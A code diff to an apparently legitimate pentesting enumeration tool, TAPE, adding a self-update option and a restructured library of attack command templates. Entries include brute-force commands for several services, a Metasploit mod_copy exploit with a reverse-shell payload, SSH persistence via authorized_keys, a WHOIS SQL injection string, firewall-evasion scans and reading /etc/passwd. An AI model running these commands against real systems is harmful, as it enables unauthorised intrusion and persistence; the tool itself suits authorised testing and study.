@@ -10,6 +10,8 @@ https://github.com/ChronosPK
 
 import os
 import sys
+import shutil
+import requests
 import argparse
 import subprocess
 from collections import defaultdict
@@ -92,6 +94,27 @@ SERVICES = {
 # Function Definitions
 # -----------------------------
 
+def update_script():
+    """Updates the script by downloading the latest version from GitHub."""
+    print(f"{BLUE}[+] Checking for updates...{NC}")
+    github_url = "https://raw.githubusercontent.com/ChronosPK/TAPE/main/tape.py"
+    try:
+        response = requests.get(github_url, timeout=10)
+        if response.status_code == 200:
+            script_path = os.path.realpath(__file__)
+            backup_path = script_path + ".bak"
+            # Backup current script
+            shutil.copy2(script_path, backup_path)
+            # Write new script
+            with open(script_path, 'w', encoding='utf-8') as script_file:
+                script_file.write(response.text)
+            print(f"{GREEN}[+] TAPE has been updated to the latest version.{NC}")
+            print(f"{YELLOW}[i] A backup of the previous version is saved as {backup_path}.{NC}")
+        else:
+            print(f"{RED}[!] Failed to download the latest version. HTTP Status Code: {response.status_code}{NC}")
+    except Exception as e:
+        print(f"{RED}[!] An error occurred while updating: {e}{NC}")
+
 # Argument Parser
 parser = argparse.ArgumentParser(
     description="TAPE - Tmux Automated Pentesting Enumeration",
@@ -105,6 +128,7 @@ parser.add_argument('-l', '--list-commands', action='store_true', help='List all
 parser.add_argument('-s', '--service', help='Specify a service to list commands for')
 parser.add_argument('-q', '--quiet', action='store_true', help='Suppress command output (commands are echoed by default)')
 parser.add_argument('-f', '--force-recon', action='store_true', help='Force reconnaissance scans even if already done')
+parser.add_argument('-u', '--update', action='store_true', help='Update TAPE to the latest version')
 args = parser.parse_args()
 
 def display_help():
@@ -198,6 +222,10 @@ def main():
         variables['IP'] = 'IP'
         variables['DOMAIN'] = 'DOMAIN'
 
+    if args.update:
+        update_script()
+        sys.exit(0)
+
     # Prioritize domain over IP in URL
     variables['URL'] = f"http://{variables['DOMAIN'] if variables['DOMAIN'] != 'DOMAIN' else variables['IP']}"
 
@@ -205,172 +233,662 @@ def main():
     create_directories_and_files()
 
     # Create commands for recon and for each service
-    COMMANDS['RECON']['Network']['netdiscover'].append({
-        'description': "",
-        'commands': [
-            "sudo netdiscover -i eth0 -r NET"
-        ]
-    })
-    COMMANDS['RECON']['Network']['nmap'].append({
-        'description': "",
-        'commands': [
-            "nmap -sn NET -oN recon/nmap.discovery",
-            "cat recon/nmap.discovery | grep -i report | cut -d' ' -f5 > recon/hosts",
-            "nmap -sC -sV -v -A -T4 -Pn -iL recon/hosts -n -p- -oN recon/nmap.network --open --max-retries 5"
-        ]
-    })
-    COMMANDS['RECON']['Network']['fping + nmap'].append({
-        'description': "",
-        'commands': [
-            "fping -a -g NET 2>/dev/null > recon/hosts",
-            "nmap -sC -sV -v -A -T4 -Pn -iL recon/hosts -n -p- -oN recon/nmap.network --open --max-retries 5"
-        ]
-    })
-    COMMANDS['RECON']['Network']['masscan'].append({
-        'description': "",
-        'commands': [
-            "masscan NET –echo > recon/masscan.conf"
-        ]
-    })
-    COMMANDS['RECON']['Network']['UDP'].append({
-        'description': "",
-        'commands': [
-            "nmap -sU -sV --version-intensity 0 -F -n NET -oN recon/nmap.udp-net",
-            "udp-proto-scanner.pl NET"
-        ]
-    })
-    COMMANDS['RECON']['Network']['No man\'s land'].append({
-        'description': "",
-        'commands': [
-            "for i in {1..254} ;do (ping -c 1 10.10.10.$i | grep 'bytes from' | awk '{print $4}' | cut -d ':' -f 1 &) ;done"
-        ]
-    })
+    COMMANDS['RECON']['Network'][''] = [
+        {
+            'description': "netdiscover",
+            'commands': [
+                "sudo netdiscover -i eth0 -r NET"
+            ]
+        },
+        {
+            'description': "nmap",
+            'commands': [
+                "nmap -Pn -p- -v -T4 --max-retries 5 IP -oN recon/nmap.init",
+                "cat recon/nmap.init | grep '/.*open' | cut -d '/' -f 1 | tr '\\n' ',' | sed 's/,$//g' > recon/ports",
+                "sudo nmap -Pn -sS -sV -n -v -A -T4 -p $(cat recon/ports) IP -oN recon/nmap.alltcp"
+            ]
+        },
+        {
+            'description': "fping + nmap",
+            'commands': [
+                "fping -a -g NET 2>/dev/null > recon/hosts",
+                "nmap -sC -sV -v -A -T4 -Pn -iL recon/hosts -n -p- -oN recon/nmap.network --open --max-retries 5"
+            ]
+        },
+        {
+            'description': "masscan",
+            'commands': [
+                "masscan NET –echo > recon/masscan.conf"
+            ]
+        },
+        {
+            'description': "UDP with nmap",
+            'commands': [
+                "nmap -sU -sV --version-intensity 0 -F -n NET -oN recon/nmap.udp-net",
+                "udp-proto-scanner.pl NET"
+            ]
+        },
+        {
+            'description': "No man's land",
+            'commands': [
+                "for i in {1..254} ;do (ping -c 1 10.10.10.$i | grep 'bytes from' | awk '{print $4}' | cut -d ':' -f 1 &) ;done"
+            ]
+        }
+    ]
 
 #------------------------------------------------------------------------------------------------------------------
-
-    COMMANDS['RECON']['Single Host']['nmap'].append({
-        'description': "Extract ports and run all-TCP scan",
-        'commands': [
-            "nmap -Pn -p- -v -T4 --max-retries 5 IP -oN recon/nmap.init",
-            "cat recon/nmap.init | grep '/.*open' | cut -d '/' -f 1 | tr '\\n' ',' | sed 's/,$//g' > recon/ports",
-            "sudo nmap -Pn -sS -sV -n -v -A -T4 -p $(cat recon/ports) IP -oN recon/nmap.alltcp"
+    COMMANDS['RECON']['Single Host']['nmap'] = [
+        {
+            "description": "Extract ports and run all-TCP scan",
+            "commands": [
+                "nmap -Pn -p- -v -T4 --max-retries 5 IP -oN recon/nmap.init",
+                "cat recon/nmap.init | grep '/.*open' | cut -d '/' -f 1 | tr '\\n' ',' | sed 's/,$//g' > recon/ports",
+                "sudo nmap -Pn -sS -sV -n -v -A -T4 -p $(cat recon/ports) IP -oN recon/nmap.alltcp"
+            ]
+        },
+        {
+            "description": "Perform OS detection with Nmap",
+            "commands": [
+                "sudo nmap -O -Pn -p- -T4 --max-retries 4 -v IP -oN recon/nmap.os"
+            ]
+        },
+        {
+            "description": "Vulnerability scan with Nmap",
+            "commands": [
+                "nmap --script vulners -Pn -sC -sV -v -A -T4 -p- --max-retries 5 --open IP -oN recon/nmap.vuln"
+            ]
+        },
+        {
+            "description": "Run UDP scan with Nmap",
+            "commands": [
+                "nmap -sU -sV -sC -n -F -T4 IP -oN recon/nmap.udp"
+            ]
+        },
+        {
+            'description': "Firewall evasion",
+            'commands': [
+                'sudo nmap -v -Pn -sS -sV -T4 --max-retries 3 --min-rate 450 --max-rtt-timeout 500ms --min-rtt-timeout 50ms -p- -f --source-port 53 --spoof-mac aa:bb:cc:dd:ee:ff IP'
         ]
-    })
-    COMMANDS['RECON']['Single Host']['nmap'].append({
-        'description': "Single TCP scan",
-        'commands': [
-            'sudo nmap -O -Pn -p- -T4 --max-retries 4 -v IP -oN recon/nmap.tcp'
-        ]
-    })
-    COMMANDS['RECON']['Single Host']['nmap'].append({
-        'description': "VULN scan",
-        'commands': [
-            'nmap --script vulners -Pn -sC -sV -v -A -T4 -p- --max-retries 5 --open IP -oN recon/nmap.vuln'
-        ]
-    })
-    COMMANDS['RECON']['Single Host']['nmap'].append({
-        'description': "UDP scan",
-        'commands': [
-            'nmap -sU -sV -sC -n -F -T4 IP -oN recon/nmap.udp'
-        ]
-    })
-    COMMANDS['RECON']['Single Host']['nmap'].append({
-        'description': "Firewall evasion",
-        'commands': [
-            'sudo nmap -v -Pn -sS -sV -T4 --max-retries 3 --min-rate 450 --max-rtt-timeout 500ms --min-rtt-timeout 50ms -p- -f --source-port 53 --spoof-mac aa:bb:cc:dd:ee:ff IP'
-        ]
-    })
-    COMMANDS['RECON']['Single Host']['nmap'].append({
-        'description': "Rustscan enumeration",
-        'commands': [
-            "rustscan -a IP --ulimit 5000 -- -sC -sV -v -oN recon/rustscan.init"
-        ]
-    })
-    COMMANDS['RECON']['Single Host']['nmap'].append({
-        'description': "Autorecon enumeration",
-        'commands': [
-            "autorecon -v --heartbeat 10 IP"
-        ]
-    })
-    COMMANDS['RECON']['Single Host']['nmap'].append({
-        'description': "Legion",
-        'commands': [
-            "sudo legion # GUI"
-        ]
-    })
-    COMMANDS['RECON']['Single Host']['nmap'].append({
-        'description': "Zenmap",
-        'commands': [
-            "zenmap # GUI"
-        ]
-    })
-    COMMANDS['RECON']['Single Host']['nmap'].append({
-        'description': "No man's land",
-        'commands': [
-            "for port in {1..65535}; do echo 2>/dev/null > /dev/tcp/IP/$port && echo -e \"$port open\\n\"; done"
-        ]
-    })
-#------------------------------------------------------------------------------------------------------------------
-    COMMANDS['FTP']['Enumeration']['Anonymous Access'].append({
-        'description': "Check for anonymous FTP login",
-        'commands': [
-            'nmap -p PORT --script ftp-anon IP -oN recon/ftp_anonymous.txt',
-            '',
-            'ftp -nv IP PORT',
-        ]
-    })
-    COMMANDS['FTP']['Enumeration']['Banner Grabbing'].append({
-        'description': "FTP Banner Grabbing",
-        'commands': [
-            'nmap -sV -p PORT IP -oN recon/ftp_banner.txt',
-            'nc -nv IP PORT',
-        ]
-    })
-    COMMANDS['FTP']['Enumeration']['Brute Force'].append({
-        'description': "FTP Brute Force with Hydra",
-        'commands': [
-            'hydra -L users.txt -P passwords.txt ftp://IP -s PORT',
-            'ftp-user-enum.pl -U /usr/share/seclists/Usernames/cirt-default-usernames.txt -t IP'
-        ]
-    })
-    COMMANDS['FTP']['Access']['Read Permissions'].append({
-        'description': "Routine checks after connecting",
-        'commands': [
-            'ls -lsa',
-            'get FILENAME',
-            'prompt; mget *',
-            'wget -r ftp://USER:PASS@IP/',
-            'quote PASV # enter a passive FTP session'
-        ]
-    })
-    COMMANDS['FTP']['Access']['Write Permissions'].append({
-        'description': "Routine checks after connecting",
-        'commands': [
-            'binary; put BINARY_FILE',
-            'ascii; put ASCII_FILE'
-        ]
-    })
-    COMMANDS['FTP']['Access']['Mount Folders'].append({
-        'description': "",
-        'commands': [
-            '# Mount',
-            'mkdir /mnt/ftp',
-            'curlftpfs IP /mnt/ftp/ -o user=USER:PASS',
-            '# Unmount'
-            'fusermount -u ftp'
-        ]
-    })
+        }
+    ]
+    COMMANDS['RECON']['Single Host']['rustscan'] = [
+        {
+            "description": "Fast rustscan analysis",
+            "commands": [
+                "rustscan -a IP --ulimit 5000 -- -sC -sV -v -oN recon/rustscan.init"
+            ]
+        },
+    ]
+    COMMANDS['RECON']['Single Host']['autorecon'] = [
+        {
+            "description": "Enumeration with autorecon",
+            "commands": [
+                "autorecon -v --heartbeat 10 IP"
+            ]
+        },
+    ]
+    COMMANDS['RECON']['Single Host']['legion'] = [
+        {
+            "description": "Recon with legion - GUI application",
+            "commands": [
+                "sudo legion"
+            ]
+        },
+    ]
+    COMMANDS['RECON']['Single Host']['zenmap'] = [
+        {
+            "description": "Recon with zenmap - GUI application",
+            "commands": [
+                "zenmap"
+            ]
+        },
+    ]
+    COMMANDS['RECON']['Single Host']['No man\'s land'] = [
+        {
+            "description": "Utilizing /dev/tcp/ip/port to test connection",
+            "commands": [
+                "for port in {1..65535}; do echo 2>/dev/null > /dev/tcp/IP/$port && echo -e \"$port open\\n\"; done"
+            ]
+        },
+    ]
 
 #------------------------------------------------------------------------------------------------------------------
+    COMMANDS['FTP']['Enumeration']['Anonymous Access'] = [
+        {
+            'description': "Check for anonymous FTP login with Nmap",
+            'commands': [
+                'nmap -p PORT --script ftp-anon IP -oN recon/ftp_anonymous.txt'
+            ]
+        },
+        {
+            'description': "Check for anonymous FTP login with FTP client",
+            'commands': [
+                'ftp -nv IP PORT'
+            ]
+        }
+    ]
+    COMMANDS['FTP']['Enumeration']['Banner Grabbing'] = [
+        {
+            'description': "FTP Banner Grabbing with Nmap",
+            'commands': [
+                'nmap -sV -p PORT IP -oN recon/ftp_banner.txt'
+            ]
+        },
+        {
+            'description': "FTP Banner Grabbing with Netcat",
+            'commands': [
+                'nc -nv IP PORT'
+            ]
+        }
+    ]
+    COMMANDS['FTP']['Enumeration']['Brute Force'] = [
+        {
+            'description': "FTP Brute Force with Hydra",
+            'commands': [
+                'hydra -L users.txt -P passwords.txt ftp://IP -s PORT'
+            ]
+        },
+        {
+            'description': "FTP User Enumeration with ftp-user-enum",
+            'commands': [
+                'ftp-user-enum.pl -U /usr/share/seclists/Usernames/cirt-default-usernames.txt -t IP'
+            ]
+        }
+    ]
+    COMMANDS['FTP']['Access']['Read Permissions'] = [
+        {
+            'description': "List files and directories",
+            'commands': [
+                'ls -lsa'
+            ]
+        },
+        {
+            'description': "Download a specific file",
+            'commands': [
+                'get FILENAME'
+            ]
+        },
+        {
+            'description': "Download all files",
+            'commands': [
+                'prompt; mget *'
+            ]
+        },
+        {
+            'description': "Recursive download using wget",
+            'commands': [
+                'wget -r ftp://USER:PASS@IP/'
+            ]
+        },
+        {
+            'description': "Enter passive FTP session",
+            'commands': [
+                'quote PASV'
+            ]
+        }
+    ]
+    COMMANDS['FTP']['Access']['Write Permissions'] = [
+        {
+            'description': "Upload binary files",
+            'commands': [
+                'binary; put BINARY_FILE'
+            ]
+        },
+        {
+            'description': "Upload ASCII files",
+            'commands': [
+                'ascii; put ASCII_FILE'
+            ]
+        }
+    ]
+    COMMANDS['FTP']['Access']['Mount Folders'] = [
+        {
+            'description': "Mount FTP folder using curlftpfs",
+            'commands': [
+                'mkdir /mnt/ftp',
+                'curlftpfs IP /mnt/ftp/ -o user=USER:PASS'
+            ]
+        },
+        {
+            'description': "Unmount FTP folder",
+            'commands': [
+                'fusermount -u /mnt/ftp'
+            ]
+        }
+    ]
+    COMMANDS['FTP']['Access']['mod_copy RCE in vsftpd 1.3.5 '] = [
+        {
+            'description': "Exploit manually",
+            'commands': [
+                'nc -v IP 21',
+                'site cpfr LOCAL_FILE',
+                'site cpto FTP_DIRECTORY'
+            ]
+        },
+        {
+            'description': "Exploit with metasploit",
+            'commands': [
+                'sudo msfdb start',
+                'msfconsole -q ',
+                'use /exploit/unix/ftp/proftpd_modcopy_exec',
+                'set Rhosts IP',
+                'set lhost tun0',
+                'set sitepath /var/www/something',
+                'set payload cmd/unix/reverse_python'
+            ]
+        }
+    ]
 
 #------------------------------------------------------------------------------------------------------------------
+    COMMANDS['SSH']['Enumeration']['Banner Grabbing'] = [
+        {
+            'description': "SSH Banner Grabbing with Nmap",
+            'commands': [
+                'nmap -p22 IP -sV'
+            ]
+        },
+        {
+            'description': "SSH Keyscan",
+            'commands': [
+                'ssh-keyscan -t rsa IP -p 22'
+            ]
+        }
+    ]
+    COMMANDS['SSH']['Enumeration']['Algorithm Enumeration'] = [
+        {
+            'description': "List supported algorithms",
+            'commands': [
+                'nmap -p22 IP --script ssh2-enum-algos -oN recon/ssh-alg'
+            ]
+        }
+    ]
+    COMMANDS['SSH']['Brute Force']['Hydra'] = [
+        {
+            'description': "Brute force SSH with Hydra",
+            'commands': [
+                'hydra -l USER -P notes/passwords.txt ssh://IP -s 22'
+            ]
+        }
+    ]
+    COMMANDS['SSH']['Access'][''] = [
+        {
+            'description': "Execute a command right after login",
+            'commands': [
+                'ssh -v USER@IP id;cat /etc/passwd'
+            ]
+        }
+    ]
+    COMMANDS['SSH']['Access']['ID_RSA key'] = [
+        {
+            'description': "Simple login",
+            'commands': [
+                'chmod 600 id_rsa',
+                'ssh -i id_rsa USER@IP'
+            ]
+        },
+        {
+            'description': "Passphrase protected",
+            'commands': [
+                'ssh2john id_rsa > notes/hashes-ssh.txt',
+                'john notes/hashes-ssh.txt --wordlist=/usr/share/wordlists/rockyou.txt'
+            ]
+        }
+    ]
+    COMMANDS['SSH']['Access']['Tunnel'] = [
+        {
+            'description': "Local Tunnel",
+            'commands': [
+                'ssh -L local_ip:local_port:destination_ip:destination_port user@IP'
+            ]
+        },
+        {
+            'description': "Remote Tunnel",
+            'commands': [
+                'ssh -R remote_ip:remote_port:destination_ip:destination_port user@IP'
+            ]
+        },
+        {
+            'description': "Additional arguments",
+            'commands': [
+                '-N don\'t execute commands',
+                '-f run in background'
+            ]
+        }
+    ]
+    COMMANDS['SSH']['Access']['Persistence'] = [
+        {
+            'description': "Generate SSH keys",
+            'commands': [
+                'ssh-keygen',
+                'scp ~/.ssh/id_rsa.pub USER@IP:/home/USER/.ssh/authorized_keys'
+            ]
+        }
+    ]
+    COMMANDS['SSH']['Other']['Port Knock'] = [
+        {
+            'description': "Check config file",
+            'commands': [
+                'sudo nano /etc/knockd.conf',
+                'sudo vim /etc/default/knockd'
+            ]
+        },
+        {
+            'description': "Knock on the found ports to open SSH",
+            'commands': [
+                'knock -v IP port1 port2 port3'
+            ]
+        }
+    ]
 
 #------------------------------------------------------------------------------------------------------------------
+    COMMANDS['TELNET']['Enumeration']['nmap'] = [
+        {
+            'description': "",
+            'commands': [
+                'nmap -n -sV -Pn --script "*telnet* and safe" -p PORT IP -oN recon/nmap.telnet'
+            ]
+        }
+    ]
+    COMMANDS['TELNET']['Bruteforce']['hydra'] = [
+        {
+            'description': "",
+            'commands': [
+                'hydra -l root -P /usr/share/seclists/Passwords/xato-net-10-million-passwords-10000.txt IP telnet'
+            ]
+        }
+    ]
 
 #------------------------------------------------------------------------------------------------------------------
+    COMMANDS['SMTP']['Enumeration']['VRFY Command'] = [
+        {
+            'description': "Check for valid users with VRFY",
+            'commands': [
+                'nc IP 25',
+                'VRFY root',
+                'VRFY user'
+            ]
+        },
+        {
+            'description': "Possible responses",
+            'commands': [
+                '252 2.0.0 root',
+                '550 5.1.1 user: ... User unknown in local recipient table'
+            ]
+        }
+    ]
+    COMMANDS['SMTP']['Enumeration']['Users Enumeration'] = [
+        {
+            'description': "With smtp-user-enum",
+            'commands': [
+                'smtp-user-enum -M VRFY -U users.txt -t IP'
+            ]
+        },
+        {
+            'description': "With nmap",
+            'commands': [
+                'nmap --script smtp-enum-users IP -oN recon/nmap.smtp-users'
+            ]
+        },
+        {
+            'description': "With metasploit",
+            'commands': [
+                'msfconsole -q -e "use auxiliary/scanner/smtp/smtp_enum"'
+            ]
+        }
+    ]
+    COMMANDS['SMTP']['Enumeration']['Allowed Commands'] = [
+        {
+            'description': "Use nmap to find allowed commands",
+            'commands': [
+                'nmap -p PORT --script smtp-commands IP -oN recon/nmap.smtp-comm'
+            ]
+        }
+    ]
+    COMMANDS['SMTP']['Enumeration']['Check NTLM Authentication'] = [
+        {
+            'description': "Use nmap",
+            'commands': [
+                'nmap -sS -v --script=*-ntlm-info --script-timeout=60s DOMAIN -oN recon/nmap.smtp-ntlm'
+            ]
+        },
+        {
+            'description': "Check for NTLM challenge response for information disclosure",
+            'commands': [
+                'telnet DOMAIN PORT',
+                'HELO ',
+                'NTLM AUTH',
+                'TlRMTVNTUAABAAAAB4IIAAAAAAAAAAAAAAAAAAAAAAA='
+            ]
+        }
+    ]
+    COMMANDS['SMTP']['Enumeration']['Find MX servers'] = [
+        {
+            'description': "Enumerate with dig",
+            'commands': [
+                'dig +short mx DOMAIN'
+            ]
+        }
+    ]
+    COMMANDS['SMTP']['Access']['Enumeration'] = [
+        {
+            'description': "Things to try while on the server",
+            'commands': [
+                '- look for info about the network topology',
+                '- view headers for relevant information'
+            ]
+        }
+    ]
 
 #------------------------------------------------------------------------------------------------------------------
+    COMMANDS['WHOIS']['Enumeration']['Find the domain'] = [
+        {
+            'description': "Enumeration",
+            'commands': [
+                'whois -h IP -p PORT "DOMAIN"',
+                'echo "DOMAIN" | nc -vn IP PORT'
+            ]
+        }
+    ]
+    COMMANDS['WHOIS']['Exploitation']['SQL injection'] = [
+        {
+            'description': "Payload",
+            'commands': [
+                'whois -h IP -p PORT "a\') or 1=1#"'
+            ]
+        }
+    ]
 
+#------------------------------------------------------------------------------------------------------------------
+    COMMANDS['DNS']['Enumeration']['Automated'] = [
+        {
+            'description': "Automated enumeration",
+            'commands': [
+                'nmap -n --script "(default and *dns*) or fcrdns or dns-srv-enum or dns-random-txid or dns-random-srcport" IP -oN recon/nmap.dns',
+                'dnscan.py -d DOMAIN -r -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt'
+            ]
+        }
+    ]
+    COMMANDS['WHOIS']['Enumeration']['View Records'] = [
+        {
+            'description': "All records",
+            'commands': [
+                'dig DOMAIN ALL'
+            ]
+        },
+        {
+            'description': "A records",
+            'commands': [
+                'dig DOMAIN +short'
+            ]
+        },
+        {
+            'description': "Mail server",
+            'commands': [
+                'dig DOMAIN -t mx +short'
+            ]
+        },
+        {
+            'description': "NS, CNAME records",
+            'commands': [
+                'dig DOMAIN -t ns +short'
+            ]
+        },
+        {
+            'description': "ZONE transfer",
+            'commands': [
+                'dig axfr DOMAIN ns08.DOMAIN',
+                'dig axfr IP DOMAIN',
+                'dig @IP DOMAIN -t AXFR +nocookie',
+                'host -t axfr DOMAIN IP',
+                'dnsrecon -d DOMAIN -t axfr'
+            ]
+        },
+        {
+            'description': "Specify a DNS server",
+            'commands': [
+                'dig @IP DOMAIN'
+            ]
+        }
+    ]
+    COMMANDS['DNS']['Bruteforce']['Subdomains'] = [
+        {
+            'description': "Bruteforce subdomains",
+            'commands': [
+                'wfuzz -c -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -u "DOMAIN" -H "Host: FUZZ.DOMAIN" --hl 7 -f recon/subdomains.txt',
+                'gobuster vhost -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -t 50 -u DOMAIN',
+                'nmap -T4 -p PORT --script dns-brute DOMAIN',
+                'dnsrecon -d DOMAIN -D /usr/share/wordlists/dnsmap.txt -t std --xml recon/dnsrecon.xml',
+                'puredns bruteforce all.txt $domain'
+            ]
+        }
+    ]
+
+#------------------------------------------------------------------------------------------------------------------
+    COMMANDS['TFTP']['Enumeration']['Nmap'] = [
+        {
+            'description': "Enumerate with nmap",
+            'commands': [
+                'nmap -n -Pn -sUV -pPORT --script tftp-enum IP -oN recon/nmap.tftp'
+            ]
+        }
+    ]
+    COMMANDS['TFTP']['Enumeration']['Metasploit'] = [
+        {
+            'description': "See upload/download capabilities",
+            'commands': [
+                'msfconsole -q -e "use auxiliary/admin/tftp/tftp_transfer_util"'
+            ]
+        }
+    ]
+
+#------------------------------------------------------------------------------------------------------------------
+    COMMANDS['SMB']['Enumeration']['Nmap Scripts'] = [
+        {
+            'description': "Run SMB NSE Scripts",
+            'commands': [
+                'nmap --script "safe or smb-enum-*" -p 139,445 IP -oN recon/nmap.smb'
+            ]
+        }
+    ]
+    COMMANDS['SMB']['Enumeration']['Enum4Linux'] = [
+        {
+            'description': "Enumerate SMB with Enum4Linux",
+            'commands': [
+                'enum4linux -avA IP > recon/enum4linux.out'
+            ]
+        }
+    ]
+    COMMANDS['SMB']['Brute Force']['Hydra'] = [
+        {
+            'description': "Brute force SMB with Hydra",
+            'commands': [
+                'hydra -L users.txt -P passwords.txt IP smb'
+            ]
+        }
+    ]
+
+#------------------------------------------------------------------------------------------------------------------
+    COMMANDS['NFS']['Enumeration']['Showmount'] = [
+        {
+            'description': "List NFS shares",
+            'commands': [
+                'showmount -e IP'
+            ]
+        }
+    ]
+    COMMANDS['NFS']['Access']['Mount Share'] = [
+        {
+            'description': "Mount NFS share",
+            'commands': [
+                'mkdir /mnt/nfs',
+                'mount -t nfs IP:/share /mnt/nfs'
+            ]
+        }
+    ]
+    COMMANDS['NFS']['Access']['Unmount Share'] = [
+        {
+            'description': "Unmount NFS share",
+            'commands': [
+                'umount /mnt/nfs'
+            ]
+        }
+    ]
+
+#------------------------------------------------------------------------------------------------------------------
+    COMMANDS['LDAP']['Enumeration']['Nmap Scripts'] = [
+        {
+            'description': "Enumerate LDAP with Nmap",
+            'commands': [
+                'nmap -n -sV --script "ldap* and not brute" IP -oN recon/nmap.ldap'
+            ]
+        }
+    ]
+    COMMANDS['LDAP']['Enumeration']['ldapsearch'] = [
+        {
+            'description': "Anonymous LDAP search",
+            'commands': [
+                'ldapsearch -x -H ldap://IP -b "DC=DOMAIN,DC=COM"'
+            ]
+        }
+    ]
+
+#------------------------------------------------------------------------------------------------------------------
+    COMMANDS['RDP']['Enumeration']['Nmap Scripts'] = [
+        {
+            'description': "Check RDP security",
+            'commands': [
+                'nmap -sV -Pn -p 3389 --script rdpscreenshot.nse IP -oN recon/nmap.rdp'
+            ]
+        }
+    ]
+    COMMANDS['RDP']['Brute Force']['Hydra'] = [
+        {
+            'description': "Brute force RDP with Hydra",
+            'commands': [
+                'hydra -L users.txt -P passwords.txt rdp://IP'
+            ]
+        }
+    ]
+
+#------------------------------------------------------------------------------------------------------------------
+    COMMANDS['MYSQL']['Enumeration']['Nmap Scripts'] = [
+        {
+            'description': "MySQL Enumeration with Nmap",
+            'commands': [
+                'nmap -sV -Pn -T4 -vv --script=mysql* IP -p 3306 -oN recon/nmap.mysql'
+            ]
+        }
+    ]
+    COMMANDS['MYSQL']['Access']['Login'] = [
+        {
+            'description': "Login to MySQL",
+            'commands': [
+                'mysql -u root -p -h IP'
+            ]
+        }
+    ]
+
+#------------------------------------------------------------------------------------------------------------------
 
 
     # List Commands
